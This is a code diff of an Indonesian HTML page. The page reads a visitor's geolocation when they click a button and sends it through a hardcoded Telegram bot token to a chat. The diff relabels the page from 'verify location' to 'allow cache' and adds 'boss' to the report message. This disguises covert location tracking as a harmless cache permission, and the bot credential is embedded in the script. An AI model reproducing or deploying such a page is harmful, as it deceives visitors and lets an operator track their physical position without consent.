@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verifikasi Lokasi</title>
+  <title>izinkan cache</title>
 </head>
 <body>
-  <h2>Verifikasi Lokasi</h2>
-  <p>Silakan klik tombol di bawah untuk memverifikasi lokasi Anda.</p>
-  <button onclick="mintaLokasi()">Verifikasi Sekarang</button>
+  <h2>izinkan cache</h2>
+  <p>Silakan klik tombol di bawah untuk mengizinkan cache Anda.</p>
+  <button onclick="mintaLokasi()">izinkan Sekarang</button>
 
   <script>
     const botToken = "7579024338:AAGkv6LtQQH3uKtqD64DVNca4V7ZYwAyLT0";
@@ -19,7 +19,7 @@
             const { latitude, longitude } = pos.coords;
             alert(`Lokasi berhasil: ${latitude}, ${longitude}`);
             // Kirim lokasi ke Telegram (opsional)
-            const pesan = `Lokasi berhasil diterima:\nLat: ${latitude}\nLon: ${longitude}`;
+            const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
           },
           (err) => {
